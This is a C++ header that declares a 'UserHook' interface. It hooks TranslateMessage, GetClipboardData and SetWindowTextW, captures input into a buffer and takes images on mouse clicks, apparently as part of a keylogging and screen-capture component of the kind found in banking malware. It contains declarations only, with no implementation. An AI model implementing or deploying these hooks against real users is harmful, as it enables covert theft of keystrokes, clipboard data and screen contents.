
#pragma once

namespace UserHook
{
 
  void init(void);

 
  void uninit(void);

 
  void enableImageOnClick(WORD clicksCount, LPSTR filePrefix);
 
  void clearInput(void);

  DWORD getInput(LPWSTR *buffer);

  BOOL WINAPI hookerTranslateMessage(const MSG *msg);

  HANDLE WINAPI hookerGetClipboardData(UINT format);


#if defined HOOKER_SETWINDOWTEXT
  BOOL WINAPI hookerSetWindowTextW(HWND window, const LPWSTR string);
#endif
};
